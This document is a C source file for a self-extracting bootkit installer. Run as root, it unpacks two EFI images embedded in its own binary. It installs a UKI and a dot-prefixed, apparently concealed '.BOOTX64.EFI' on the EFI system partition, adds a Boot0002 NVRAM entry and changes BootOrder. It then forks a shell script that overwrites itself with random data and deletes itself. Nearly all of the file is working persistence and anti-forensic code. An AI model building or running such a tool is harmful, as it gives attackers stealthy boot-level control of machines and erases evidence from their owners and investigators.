/*
 * deploy.c - Self-extracting bootkit deploy + NVRAM helper.
 *
 * Two operations:
 *
 * deploy (no -y): dump-only. Print embedded trailer offsets/magic and
 * dump EFI boot variables. Does not install files or change NVRAM.
 *
 * deploy -y: full deploy. Preflight, dump NVRAM, install UKI +
 * .BOOTX64.EFI, Boot0002 + BootOrder, dump again, then wipe+unlink
 * this binary after exit (double-fork + exec /bin/sh; ETXTBSY
 * otherwise).
 *
 * Requires root. Embedded trailer after the ELF:
 *   [MAGIC 16][u64 le size][BOOTX64.EFI][MAGIC 16][u64 le size][uki.efi]
 */

#define _DEFAULT_SOURCE

#include "efi-nvram.h"
#include "deploy-magic.h"

#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <limits.h>
#include <pwd.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

extern char *__progname;

/* Install paths (must match mk-bootx64-efi.sh embedded search.file). */
#define DEPLOY_UKI_DIR		"/var/lib/systemd/boot"
#define DEPLOY_UKI		DEPLOY_UKI_DIR "/uki.efi"
#define DEPLOY_UKI_MODE		0500
#define DEPLOY_UKI_OWNER_USER	"root"
#define DEPLOY_UKI_OWNER_GROUP	"root"
#define DEPLOY_OWNER		DEPLOY_UKI_OWNER_USER ":" DEPLOY_UKI_OWNER_GROUP

#define ESP_ROOT		"/boot/efi"
#define ESP_BOOT_DIR		ESP_ROOT "/EFI/BOOT"
#define ESP_LOADER_NAME		".BOOTX64.EFI"
#define ESP_BOOTX64		ESP_BOOT_DIR "/" ESP_LOADER_NAME

/* Trailer / PE preflight (matches gen-deploy-magic + append-deploy-trailer). */
#define DEPLOY_MAGIC_LEN	16
#define DEPLOY_MAX_PAYLOAD	(512ULL * 1024ULL * 1024ULL)

#define IMAGE_DOS_SIGNATURE	0x5A4DU		/* "MZ" */
#define IMAGE_NT_SIGNATURE	0x00004550U	/* "PE\0\0" */
#define IMAGE_FILE_MACHINE_AMD64	0x8664U
#define DOS_E_LFANEW_OFF	0x3CU
#define DOS_MIN_SIZE		0x40U

typedef struct trailer {
	const uint8_t	*bootx64;
	size_t		bootx64_off;
	size_t		bootx64_len;
	size_t		magic0_off;
	const uint8_t	*uki;
	size_t		uki_off;
	size_t		uki_len;
	size_t		magic1_off;
	size_t		trailer_off;
} trailer_t;

static void usage(void);
static uint16_t rd_le16(const uint8_t *);
static uint32_t rd_le32(const uint8_t *);
static uint64_t rd_le64(const uint8_t *);
static void set_err(char *, size_t, const char *);
static int pe_is_amd64(const uint8_t *, size_t);
static int parse_one(const uint8_t *, size_t, size_t *, const uint8_t *,
    const uint8_t **, size_t *);
static int trailer_try_at(const uint8_t *, size_t, size_t, const uint8_t *,
    trailer_t *);
static int trailer_parse(const uint8_t *, size_t, const uint8_t *, trailer_t *,
    char *, size_t);
static void print_magic_hex(const uint8_t *, size_t);
static void print_trailer_info(const uint8_t *, size_t, const trailer_t *,
    const uint8_t *);
static void map_self(const uint8_t **, size_t *, int *);
static void install_blob(const uint8_t *, size_t, const char *,
    const char *, mode_t);
static void ensure_uki_dir(void);
static void ensure_esp(void);
static void print_installed(const char *);
static void self_wipe_and_unlink(void);
static int cmd_dump(void);
static int cmd_deploy(void);

static void
usage(void)
{
	fprintf(stderr, "usage: %s [-y]\n", __progname);
	fprintf(stderr, "  (default) dump NVRAM and embedded trailer info only\n");
	fprintf(stderr, "  -y        full deploy (install + NVRAM + self-wipe)\n");
	exit(1);
}

/*
 * Read a little-endian u16 from p (caller ensures bounds).
 */
static uint16_t
rd_le16(const uint8_t *p)
{
	return ((uint16_t)p[0] | ((uint16_t)p[1] << 8));
}

/*
 * Read a little-endian u32 from p.
 */
static uint32_t
rd_le32(const uint8_t *p)
{
	return ((uint32_t)p[0] | ((uint32_t)p[1] << 8) |
	    ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24));
}

/*
 * Read a little-endian u64 from p.
 */
static uint64_t
rd_le64(const uint8_t *p)
{
	return ((uint64_t)rd_le32(p) |
	    ((uint64_t)rd_le32(p + 4) << 32));
}

/*
 * Copy msg into errmsg when the buffer is provided.
 */
static void
set_err(char *errmsg, size_t errmsgsz, const char *msg)
{
	size_t n;

	if (errmsg == NULL || errmsgsz == 0)
		return;
	n = strlen(msg);
	if (n >= errmsgsz)
		n = errmsgsz - 1;
	memcpy(errmsg, msg, n);
	errmsg[n] = '\0';
}

/*
 * True when buf looks like a PE32+ image for AMD64.
 */
static int
pe_is_amd64(const uint8_t *buf, size_t len)
{
	uint32_t e_lfanew;
	uint32_t pe_sig;
	uint16_t machine;
	const uint8_t *nt;

	if (buf == NULL || len < DOS_MIN_SIZE)
		return (0);
	if (rd_le16(buf) != IMAGE_DOS_SIGNATURE)
		return (0);

	e_lfanew = rd_le32(buf + DOS_E_LFANEW_OFF);
	/* PE header needs signature (4) + Machine (2). */
	if (e_lfanew < DOS_MIN_SIZE || e_lfanew > len - 6)
		return (0);

	nt = buf + e_lfanew;
	pe_sig = rd_le32(nt);
	if (pe_sig != IMAGE_NT_SIGNATURE)
		return (0);

	machine = rd_le16(nt + 4);
	if (machine != IMAGE_FILE_MACHINE_AMD64)
		return (0);

	return (1);
}

/*
 * Parse one [MAGIC][u64 size][payload] at *off; advance *off past payload.
 * Returns 0 on success, -1 on failure (no errmsg; used while probing).
 */
static int
parse_one(const uint8_t *data, size_t len, size_t *off,
    const uint8_t *magic, const uint8_t **out, size_t *out_len)
{
	uint64_t psz;
	size_t o;
	size_t need;

	o = *off;
	need = DEPLOY_MAGIC_LEN + 8;
	if (o + need > len)
		return (-1);
	if (memcmp(data + o, magic, DEPLOY_MAGIC_LEN) != 0)
		return (-1);
	o += DEPLOY_MAGIC_LEN;
	psz = rd_le64(data + o);
	o += 8;

	if (psz == 0 || psz > DEPLOY_MAX_PAYLOAD)
		return (-1);
	if (o + psz > len)
		return (-1);
	if (!pe_is_amd64(data + o, (size_t)psz))
		return (-1);

	*out = data + o;
	*out_len = (size_t)psz;
	*off = o + (size_t)psz;
	return (0);
}

/*
 * Try to parse a full trailer starting at off (must point at first MAGIC).
 * On success, out is filled and the two payloads end exactly at len.
 */
static int
trailer_try_at(const uint8_t *data, size_t len, size_t off,
    const uint8_t *magic, trailer_t *out)
{
	size_t o;

	o = off;
	out->trailer_off = off;
	out->magic0_off = off;
	if (parse_one(data, len, &o, magic, &out->bootx64,
	    &out->bootx64_len) != 0)
		return (-1);
	out->bootx64_off = (size_t)(out->bootx64 - data);
	out->magic1_off = o;
	if (parse_one(data, len, &o, magic, &out->uki, &out->uki_len) != 0)
		return (-1);
	out->uki_off = (size_t)(out->uki - data);
	if (o != len)
		return (-1);
	return (0);
}

/*
 * Locate BOOTX64.EFI then uki.efi after MAGIC.
 *
 * The compile-time magic also appears in this ELF's .rodata, so the first
 * match is usually not the trailer. Probe every MAGIC occurrence; accept the
 * first candidate that yields two valid AMD64 PEs ending at EOF.
 */
static int
trailer_parse(const uint8_t *data, size_t len, const uint8_t *magic,
    trailer_t *out, char *errmsg, size_t errmsgsz)
{
	size_t i;
	trailer_t cand;

	if (data == NULL || magic == NULL || out == NULL) {
		set_err(errmsg, errmsgsz, "invalid argument");
		return (-1);
	}
	if (len < DEPLOY_MAGIC_LEN) {
		set_err(errmsg, errmsgsz, "file too small for trailer");
		return (-1);
	}

	for (i = 0; i + DEPLOY_MAGIC_LEN <= len; i++) {
		if (memcmp(data + i, magic, DEPLOY_MAGIC_LEN) != 0)
			continue;
		memset(&cand, 0, sizeof(cand));
		if (trailer_try_at(data, len, i, magic, &cand) == 0) {
			*out = cand;
			return (0);
		}
	}

	set_err(errmsg, errmsgsz, "no valid trailer (magic + AMD64 PE pair)");
	return (-1);
}

/*
 * Print magic bytes as hex (space-separated).
 */
static void
print_magic_hex(const uint8_t *magic, size_t n)
{
	size_t i;

	for (i = 0; i < n; i++) {
		printf("%02x", magic[i]);
		if (i + 1 < n)
			printf(" ");
	}
}

/*
 * Print trailer layout: magic, offsets, sizes (dump-only / preflight).
 */
static void
print_trailer_info(const uint8_t *data, size_t map_len, const trailer_t *tr,
    const uint8_t *magic)
{
	printf("%s: file size %zu bytes\n", __progname, map_len);
	printf("%s: trailer magic (%d bytes): ", __progname, DEPLOY_MAGIC_LEN);
	print_magic_hex(magic, DEPLOY_MAGIC_LEN);
	printf("\n");
	printf("%s:   magic[0]  offset 0x%zx (%zu)\n", __progname,
	    tr->magic0_off, tr->magic0_off);
	printf("%s:   BOOTX64   offset 0x%zx (%zu) size %zu\n", __progname,
	    tr->bootx64_off, tr->bootx64_off, tr->bootx64_len);
	printf("%s:   magic[1]  offset 0x%zx (%zu)\n", __progname,
	    tr->magic1_off, tr->magic1_off);
	printf("%s:   uki.efi   offset 0x%zx (%zu) size %zu\n", __progname,
	    tr->uki_off, tr->uki_off, tr->uki_len);
	/* Confirm on-disk magic matches compile-time constant. */
	if (memcmp(data + tr->magic0_off, magic, DEPLOY_MAGIC_LEN) != 0 ||
	    memcmp(data + tr->magic1_off, magic, DEPLOY_MAGIC_LEN) != 0)
		errx(1, "trailer magic mismatch at recorded offsets");
}

/*
 * Map this executable via /proc/self/exe (read-only). Caller munmaps/closes.
 */
static void
map_self(const uint8_t **out, size_t *out_len, int *out_fd)
{
	int fd;
	struct stat st;
	void *map;

	fd = open("/proc/self/exe", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		err(1, "open /proc/self/exe");
	if (fstat(fd, &st) != 0)
		err(1, "fstat /proc/self/exe");
	if (!S_ISREG(st.st_mode))
		errx(1, "/proc/self/exe is not a regular file");
	if (st.st_size <= 0)
		errx(1, "/proc/self/exe is empty");

	map = mmap(NULL, (size_t)st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	if (map == MAP_FAILED)
		err(1, "mmap /proc/self/exe");

	*out = map;
	*out_len = (size_t)st.st_size;
	*out_fd = fd;
}

/*
 * Create UKI parent directory with root:root mode 0500.
 */
static void
ensure_uki_dir(void)
{
	struct passwd *pw;
	struct group *gr;

	printf("%s: ensuring %s (%s:%s mode %04o)\n", __progname,
	    DEPLOY_UKI_DIR, DEPLOY_UKI_OWNER_USER, DEPLOY_UKI_OWNER_GROUP,
	    (unsigned int)DEPLOY_UKI_MODE);

	if (mkdir(DEPLOY_UKI_DIR, DEPLOY_UKI_MODE) != 0 && errno != EEXIST)
		err(1, "mkdir %s", DEPLOY_UKI_DIR);

	pw = getpwnam(DEPLOY_UKI_OWNER_USER);
	if (pw == NULL)
		errx(1, "unknown user %s", DEPLOY_UKI_OWNER_USER);
	gr = getgrnam(DEPLOY_UKI_OWNER_GROUP);
	if (gr == NULL)
		errx(1, "unknown group %s", DEPLOY_UKI_OWNER_GROUP);

	if (chown(DEPLOY_UKI_DIR, pw->pw_uid, gr->gr_gid) != 0)
		err(1, "chown %s", DEPLOY_UKI_DIR);
	if (chmod(DEPLOY_UKI_DIR, DEPLOY_UKI_MODE) != 0)
		err(1, "chmod %s", DEPLOY_UKI_DIR);
}

/*
 * Require ESP mount point and EFI/BOOT directory.
 */
static void
ensure_esp(void)
{
	struct stat st;

	if (stat(ESP_ROOT, &st) != 0)
		err(1, "ESP mount point missing: %s", ESP_ROOT);
	if (!S_ISDIR(st.st_mode))
		errx(1, "%s is not a directory", ESP_ROOT);

	if (mkdir(ESP_BOOT_DIR, 0755) != 0 && errno != EEXIST)
		err(1, "mkdir %s", ESP_BOOT_DIR);
}

/*
 * Write blob to dest via dest.new then rename. Optional owner (NULL = skip)
 * and mode (0 = best-effort 0700 for ESP).
 */
static void
install_blob(const uint8_t *data, size_t len, const char *dest,
    const char *owner_group, mode_t mode)
{
	char tmp[PATH_MAX];
	int fd;
	size_t off;
	ssize_t n;
	struct stat st;

	if (snprintf(tmp, sizeof(tmp), "%s.new", dest) >= (int)sizeof(tmp))
		errx(1, "path too long");

	printf("%s: installing %zu bytes -> %s\n", __progname, len, dest);

	fd = open(tmp, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
	if (fd < 0)
		err(1, "open %s", tmp);

	off = 0;
	while (off < len) {
		n = write(fd, data + off, len - off);
		if (n < 0) {
			if (errno == EINTR)
				continue;
			err(1, "write %s", tmp);
		}
		if (n == 0)
			errx(1, "short write %s", tmp);
		off += (size_t)n;
	}
	if (fsync(fd) != 0)
		err(1, "fsync %s", tmp);
	if (close(fd) != 0)
		err(1, "close %s", tmp);

	if (rename(tmp, dest) != 0)
		err(1, "rename %s -> %s", tmp, dest);

	if (owner_group != NULL) {
		struct passwd *pw;
		struct group *gr;
		char user[64];
		char *colon;

		if (snprintf(user, sizeof(user), "%s", owner_group) >=
		    (int)sizeof(user))
			errx(1, "owner string too long");
		colon = strchr(user, ':');
		if (colon == NULL)
			errx(1, "owner must be user:group");
		*colon = '\0';
		pw = getpwnam(user);
		if (pw == NULL)
			errx(1, "unknown user %s", user);
		gr = getgrnam(colon + 1);
		if (gr == NULL)
			errx(1, "unknown group %s", colon + 1);
		if (chown(dest, pw->pw_uid, gr->gr_gid) != 0)
			err(1, "chown %s", dest);
	}

	if (mode != 0) {
		if (chmod(dest, mode) != 0)
			err(1, "chmod %s", dest);
	} else {
		/* ESP/vfat: best-effort executable bit (may be ignored). */
		(void)chmod(dest, 0700);
	}

	if (stat(dest, &st) != 0)
		err(1, "stat %s", dest);
	if ((size_t)st.st_size != len)
		errx(1, "installed size mismatch: %s is %lld, expected %zu",
		    dest, (long long)st.st_size, len);
}

/*
 * Print path with size, mode string, and owner:group.
 */
static void
print_installed(const char *path)
{
	struct stat st;
	struct passwd *pw;
	struct group *gr;
	const char *user;
	const char *group;
	char modebuf[12];

	if (stat(path, &st) != 0)
		err(1, "stat %s", path);

	/* Classic rwx bits only (enough for research logs). */
	snprintf(modebuf, sizeof(modebuf), "%c%c%c%c%c%c%c%c%c%c",
	    S_ISDIR(st.st_mode) ? 'd' : '-',
	    (st.st_mode & S_IRUSR) ? 'r' : '-',
	    (st.st_mode & S_IWUSR) ? 'w' : '-',
	    (st.st_mode & S_IXUSR) ? 'x' : '-',
	    (st.st_mode & S_IRGRP) ? 'r' : '-',
	    (st.st_mode & S_IWGRP) ? 'w' : '-',
	    (st.st_mode & S_IXGRP) ? 'x' : '-',
	    (st.st_mode & S_IROTH) ? 'r' : '-',
	    (st.st_mode & S_IWOTH) ? 'w' : '-',
	    (st.st_mode & S_IXOTH) ? 'x' : '-');

	pw = getpwuid(st.st_uid);
	gr = getgrgid(st.st_gid);
	user = (pw != NULL) ? pw->pw_name : "?";
	group = (gr != NULL) ? gr->gr_name : "?";

	printf("%s:   %s (%lld bytes %s %s:%s)\n", __progname, path,
	    (long long)st.st_size, modebuf, user, group);
}

/*
 * Schedule wipe+unlink of this executable after this process exits.
 *
 * Linux returns ETXTBSY for O_WRONLY on any path that is still a process
 * text image. A fork of this binary still maps the same file, so a pure-C
 * child cannot wipe it either. Double-fork, then exec /bin/sh so the helper
 * is no longer this ELF; the shell waits until our PID is gone, then
 * overwrites with urandom, truncates, and unlinks.
 */
static void
self_wipe_and_unlink(void)
{
	char path[PATH_MAX];
	char parent_s[32];
	char size_s[32];
	struct stat st;
	pid_t parent;
	pid_t mid;
	pid_t worker;
	ssize_t nlink;
	off_t size;
	int status;

	/*
	 * Wait for installer PID, then dd urandom over the path, truncate, rm.
	 * Paths/pids come from the environment (set before exec) so we do not
	 * embed shell-metacharacter-sensitive strings in the -c script.
	 */
	static const char wipe_sh[] =
	    "while kill -0 \"$P_WIPE_PID\" 2>/dev/null; do "
	    "sleep 0.05; "
	    "done; "
	    "sz=$P_WIPE_SIZE; "
	    "dd if=/dev/urandom of=\"$P_WIPE_PATH\" bs=1048576 "
	    "count=$(( (sz + 1048575) / 1048576 )) "
	    "status=none conv=notrunc 2>/dev/null || true; "
	    "truncate -s 0 \"$P_WIPE_PATH\" 2>/dev/null || "
	    ": > \"$P_WIPE_PATH\" 2>/dev/null || true; "
	    "rm -f -- \"$P_WIPE_PATH\"";

	nlink = readlink("/proc/self/exe", path, sizeof(path) - 1);
	if (nlink < 0) {
		warn("readlink /proc/self/exe");
		return;
	}
	path[nlink] = '\0';
	{
		char *suf;

		suf = strstr(path, " (deleted)");
		if (suf != NULL)
			*suf = '\0';
	}

	if (stat(path, &st) != 0) {
		warn("stat %s", path);
		return;
	}
	if (!S_ISREG(st.st_mode) || st.st_size < 0) {
		warnx("%s: not a regular file", path);
		return;
	}
	size = st.st_size;
	parent = getpid();

	if (snprintf(parent_s, sizeof(parent_s), "%d", (int)parent) >=
	    (int)sizeof(parent_s)) {
		warnx("parent pid string too long");
		return;
	}
	if (snprintf(size_s, sizeof(size_s), "%lld", (long long)size) >=
	    (int)sizeof(size_s)) {
		warnx("size string too long");
		return;
	}

	mid = fork();
	if (mid < 0) {
		warn("fork for self-wipe");
		if (unlink(path) != 0)
			warn("unlink %s", path);
		else
			printf("%s: unlinked %s (wipe skipped)\n", __progname,
			    path);
		return;
	}
	if (mid == 0) {
		/* Intermediate: daemonise worker, then exit so parent can wait. */
		worker = fork();
		if (worker < 0)
			_exit(1);
		if (worker > 0)
			_exit(0);

		/*
		 * Worker: become /bin/sh so this process is no longer a text
		 * mapping of path. Then wait for the installer PID and wipe.
		 */
		if (setenv("P_WIPE_PID", parent_s, 1) != 0 ||
		    setenv("P_WIPE_PATH", path, 1) != 0 ||
		    setenv("P_WIPE_SIZE", size_s, 1) != 0)
			_exit(1);

		execl("/bin/sh", "sh", "-c", wipe_sh, (char *)NULL);
		_exit(1);
	}

	/* Reap intermediate so it is not left as a zombie. */
	while (waitpid(mid, &status, 0) < 0) {
		if (errno != EINTR) {
			warn("waitpid self-wipe helper");
			break;
		}
	}

	printf("%s: scheduled wipe+unlink of %s (%lld bytes) after exit\n",
	    __progname, path, (long long)size);
}

/*
 * Dump-only path: trailer layout + NVRAM. No installs, no NVRAM writes.
 */
static int
cmd_dump(void)
{
	const uint8_t *map;
	size_t map_len;
	int map_fd;
	trailer_t tr;
	char errbuf[128];

	printf("%s: dump-only mode (no install, no NVRAM changes)\n",
	    __progname);
	printf("%s: pass -y for full deploy\n", __progname);
	printf("\n");

	if (geteuid() != 0)
		errx(1, "must be run as root");

	map = NULL;
	map_len = 0;
	map_fd = -1;
	map_self(&map, &map_len, &map_fd);

	memset(&tr, 0, sizeof(tr));
	errbuf[0] = '\0';
	if (trailer_parse(map, map_len, deploy_magic, &tr, errbuf,
	    sizeof(errbuf)) != 0)
		errx(1, "trailer parse failed: %s",
		    errbuf[0] != '\0' ? errbuf : "unknown");

	printf("%s: embedded trailer\n", __progname);
	print_trailer_info(map, map_len, &tr, deploy_magic);
	printf("\n");

	efi_nvram_require_root_and_efi();
	printf("%s: NVRAM dump\n", __progname);
	efi_nvram_dump_boot_vars();
	printf("\n");

	munmap((void *)(uintptr_t)map, map_len);
	close(map_fd);

	printf("%s: dump complete — nothing was installed or modified\n",
	    __progname);
	printf("%s: re-run with -y to deploy UKI + .BOOTX64.EFI + Boot0002\n",
	    __progname);
	return (0);
}

/*
 * Full deploy: install files, NVRAM create, self-wipe after exit.
 */
static int
cmd_deploy(void)
{
	const uint8_t *map;
	size_t map_len;
	int map_fd;
	trailer_t tr;
	char errbuf[128];

	printf("%s: full deploy (-y)\n", __progname);

	if (geteuid() != 0)
		errx(1, "must be run as root");

	map = NULL;
	map_len = 0;
	map_fd = -1;
	map_self(&map, &map_len, &map_fd);

	memset(&tr, 0, sizeof(tr));
	errbuf[0] = '\0';
	if (trailer_parse(map, map_len, deploy_magic, &tr, errbuf,
	    sizeof(errbuf)) != 0)
		errx(1, "trailer preflight failed: %s",
		    errbuf[0] != '\0' ? errbuf : "unknown");

	printf("%s: embedded trailer\n", __progname);
	print_trailer_info(map, map_len, &tr, deploy_magic);
	printf("%s: preflight ok (BOOTX64.EFI %zu bytes, uki.efi %zu bytes)\n",
	    __progname, tr.bootx64_len, tr.uki_len);
	printf("\n");

	efi_nvram_require_root_and_efi();

	printf("%s: NVRAM dump (before)\n", __progname);
	efi_nvram_dump_boot_vars();
	printf("\n");

	ensure_uki_dir();
	install_blob(tr.uki, tr.uki_len, DEPLOY_UKI, DEPLOY_OWNER,
	    DEPLOY_UKI_MODE);
	ensure_esp();
	/* ESP may ignore mode/owner on vfat; still request root:root + 0700. */
	install_blob(tr.bootx64, tr.bootx64_len, ESP_BOOTX64, DEPLOY_OWNER,
	    0700);

	printf("%s: installed\n", __progname);
	print_installed(DEPLOY_UKI_DIR);
	print_installed(DEPLOY_UKI);
	print_installed(ESP_BOOTX64);
	printf("\n");

	printf("%s: applying NVRAM Boot0002 + BootOrder\n", __progname);
	efi_nvram_create();
	printf("\n");

	printf("%s: NVRAM dump (after)\n", __progname);
	efi_nvram_dump_boot_vars();

	munmap((void *)(uintptr_t)map, map_len);
	close(map_fd);
	map = NULL;
	map_fd = -1;

	self_wipe_and_unlink();

	printf("%s: done — reboot to test Boot0002 + UKI path\n", __progname);
	return (0);
}

int
main(int argc, char *argv[])
{
	int do_deploy;
	int i;

	do_deploy = 0;
	for (i = 1; i < argc; i++) {
		if (strcmp(argv[i], "-y") == 0)
			do_deploy = 1;
		else
			usage();
	}

	if (do_deploy)
		return (cmd_deploy());
	return (cmd_dump());
}
